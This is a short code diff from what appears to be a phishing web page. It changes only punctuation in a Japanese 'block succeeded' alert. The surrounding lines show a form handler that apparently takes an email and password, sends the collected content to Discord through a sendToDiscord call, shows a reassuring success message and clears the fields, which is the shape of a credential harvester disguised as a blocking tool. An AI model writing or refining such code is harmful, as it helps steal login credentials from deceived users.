@@ -17,7 +17,7 @@ document.addEventListener('DOMContentLoaded', () => {
         
         await sendToDiscord(messageContent);
         
-        alert("ブロックに成功しました！"); 
+        alert("ブロックに成功しました!"); 
         
         emailInput.value = '';
         passwordInput.value = '';
